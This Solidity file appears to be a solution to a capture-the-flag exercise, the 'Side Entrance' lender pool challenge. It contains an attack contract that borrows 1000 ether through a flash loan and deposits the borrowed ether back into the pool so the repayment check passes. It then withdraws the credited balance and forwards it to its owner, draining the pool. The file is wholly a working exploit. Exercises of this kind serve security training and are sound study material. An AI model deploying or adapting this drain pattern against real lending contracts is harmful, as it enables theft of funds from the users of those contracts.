// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract Attack is IFlashLoanEtherReceiver {
    uint256 private constant ETHER_IN_POOL = 1000 ether;

    SideEntranceLenderPool private lenderPool;
    address private owner;

    constructor(address _lenderPool) {
        lenderPool = SideEntranceLenderPool(_lenderPool);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not the owner");
        _;
    }

    function attack() external {
        lenderPool.flashLoan(ETHER_IN_POOL);
    }

    function withdraw() external {
        lenderPool.withdraw();
    }

    function execute() external payable {
        require(msg.sender == address(lenderPool), "not the lender pool");
        lenderPool.deposit{value: ETHER_IN_POOL}();
    }

    receive() external payable {
        (bool success,) = payable(owner).call{value: msg.value}("");
        require(success, "transfer failed.");
    }
}
